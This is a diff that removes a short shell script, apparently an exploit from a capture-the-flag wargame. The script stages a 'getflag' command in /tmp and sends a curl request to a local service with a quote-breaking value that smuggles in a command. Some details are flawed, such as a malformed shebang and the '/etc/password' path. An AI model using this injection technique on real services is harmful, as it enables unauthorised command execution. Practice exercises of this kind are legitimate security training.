@@ -1,5 +1,0 @@
-#!/bin/sh
-
-echo "#!/bin/sh;getflag > /tmp/flag" >> /tmp/xd
-chmod a+x /tmp/xd
-curl localhost:4646?x='"/etc/password||x="'
